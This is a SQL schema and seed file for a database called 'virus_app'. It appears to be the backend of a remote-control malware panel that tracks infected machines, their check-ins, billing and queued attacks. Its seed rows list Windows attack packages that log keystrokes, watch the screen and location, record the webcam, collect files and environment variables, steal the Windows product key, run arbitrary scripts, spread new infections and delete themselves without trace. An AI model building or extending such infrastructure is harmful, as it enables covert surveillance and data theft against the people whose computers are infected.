-- noinspection SqlIdentifierLengthForFile

create database if not exists virus_app character set utf8mb4 collate utf8mb4_0900_ai_ci;

use virus_app;
CREATE TABLE IF NOT EXISTS users
(
    user_handle       varchar(20)     not null,
    resource_usage_id bigint unsigned not null,
    password_hash     varchar(64)     not null, /* sha256 hash */
    password_salt     varchar(5)      not null, /* random 5 character string */
    name              varchar(100)    not null,
    timezone          varchar(100)    not null default 'GMT',
    hold              bit             not null default 0, /* 1 if the installation entry point is blocked off, 0 for freely interchangeable */
    unpaid_amount     bigint unsigned not null default 0, /* in cents */
    dark_mode         bit             not null default 0, /* 0 if light, 1 if dark */
    index (user_handle),
    primary key (user_handle)
);

CREATE TABLE IF NOT EXISTS viruses
(
    virus_id          varchar(64)     not null, /* sha256 hash */
    user_handle       varchar(20)     not null,
    resource_usage_id bigint unsigned not null,
    last_ping         bigint unsigned not null default 0, /* unix timestamp */
    name              varchar(50)     not null default '(not set)', /* short text of the virus, equivalent to "target name', if you will */
    active            bit             not null default b'0', /* whether this virus is currently active (pinging back) or not. 0 for not active, 1 for active */
    type              bit             not null default b'0', /* what type is this virus? 0 for normal virus, 1 for swarm */
    class             varchar(50)     not null, /* like classes in css, this just provides a grouping of attack packages, so viruses know what packages is legal. Each virus can only have 1 class */
    index (virus_id, user_handle),
    primary key (virus_id)
);

CREATE TABLE IF NOT EXISTS attacks
(
    attack_id         varchar(64)     not null, /* sha256 hash */
    virus_id          varchar(64)     not null, /* sha256 hash */
    resource_usage_id bigint unsigned not null,
    attack_package    varchar(100)    not null, /* attack package, like win.oneTime.ScanPartitions */
    status            varchar(10)     not null default 'Dormant', /* dormant | deployed | executed */
    executed_time     bigint unsigned not null default 0, /* unix timestamp */
    name              varchar(50)     not null default '(not set)', /* short text of the attack, to identify itself */
    index (attack_id, virus_id),
    primary key (attack_id)
);

CREATE TABLE IF NOT EXISTS uptimes
( /* used to make virus uptime graph */
    virus_id  varchar(64)     not null,
    unix_time bigint unsigned not null,
    active    bit             not null,
    index (virus_id, unix_time),
    primary key (virus_id, unix_time)
);

CREATE TABLE IF NOT EXISTS resource_usage
(
    id                      bigint unsigned not null auto_increment,
    static_disk             bigint unsigned default 0, /* measured in bytes */
    dynamic_bandwidth       bigint unsigned default 0, /* measured in bytes */
    dynamic_api_geolocation bigint unsigned default 0, /* measured in cents */
    index (id),
    primary key (id)
);

DROP TABLE IF EXISTS packageInfo; /* this is static information, so should be fine */
CREATE TABLE IF NOT EXISTS packageInfo
(
    package_name varchar(100)  not null, /* unique package name. This matches attack_package field in table attacks */
    class_name   varchar(300)  not null, /* this should have the full class name with namespace included */
    location     varchar(200)  not null, /* this should look something like Windows/Background/MonitorLocation */
    display_name varchar(100)  not null, /* package name displayed to users */
    description  varchar(1000) not null,
    index (package_name),
    primary key (package_name)
);

INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.background.MonitorLocation',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\Background\\MonitorLocation\\MonitorLocation',
        'Windows/Background/MonitorLocation',
        'easy.background.MonitorLocation',
        'Continuously monitors for the host computer\'s location');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.background.MonitorScreen',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\Background\\MonitorScreen\\MonitorScreen',
        'Windows/Background/MonitorScreen',
        'easy.background.MonitorScreen',
        'Continuously monitors the screen');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.background.MonitorKeyboard',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\Background\\MonitorKeyboard\\MonitorKeyboard',
        'Windows/Background/MonitorKeyboard',
        'easy.background.MonitorKeyboard',
        'Continuously monitors every keystrokes');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.ActivateSwarm',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ActivateSwarm\\ActivateSwarm',
        'Windows/OneTime/ActivateSwarm',
        'adv.ActivateSwarm',
        'Installs a more complex version of this virus that can fight back');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.CheckPermission',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CheckPermission\\CheckPermission',
        'Windows/OneTime/CheckPermission',
        'adv.CheckPermission',
        'Checks permission of a bunch of folders');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.CollectEnv',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectEnv\\CollectEnv',
        'Windows/OneTime/CollectEnv',
        'easy.CollectEnv',
        'Collects environmental variables, like JAVA_PATH, Path, UserDomain, etc.');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.CollectFile',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\CollectFile\\CollectFile',
        'Windows/OneTime/CollectFile',
        'easy.CollectFile',
        'Collects a bunch of files');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.ExecuteScript',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ExecuteScript\\ExecuteScript',
        'Windows/OneTime/ExecuteScript',
        'adv.ExecuteScript',
        'Executes a custom script. This is discouraged, because the whole point of attack packages is to make sure the code runs well. Use this at your own risk as you might lose the virus to uncontrolled behavior.');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.ExploreDir',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ExploreDir\\ExploreDir',
        'Windows/OneTime/ExploreDir',
        'easy.ExploreDir',
        'Explores a particular directory.');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.NewVirus',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\NewVirus\\NewVirus',
        'Windows/OneTime/NewVirus',
        'easy.NewVirus',
        'Installs a new virus');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.Power',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Power\\Power',
        'Windows/OneTime/Power',
        'easy.Power',
        'Power-related operations: shutdown or restart');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.ScanPartitions',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ScanPartitions\\ScanPartitions',
        'Windows/OneTime/ScanPartitions',
        'easy.ScanPartitions',
        'Scans for every available partitions on the target computer.');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.Screenshot',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Screenshot\\Screenshot',
        'Windows/OneTime/Screenshot',
        'easy.Screenshot',
        'Takes a screenshot');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.SelfDestruct',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SelfDestruct\\SelfDestruct',
        'Windows/OneTime/SelfDestruct',
        'easy.SelfDestruct',
        'Deletes the virus permanently, leaving no traces left.');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.SystemInfo',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\SystemInfo\\SystemInfo',
        'Windows/OneTime/SystemInfo',
        'easy.SystemInfo',
        'Gets some basic system information.');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.ProductKey',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ProductKey\\ProductKey',
        'Windows/OneTime/ProductKey',
        'easy.ProductKey',
        'Gets Windows product key');
INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
VALUES ('win.oneTime.Webcam',
        '\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\Webcam\\Webcam',
        'Windows/OneTime/Webcam',
        'easy.Webcam',
        'Takes webcam video');
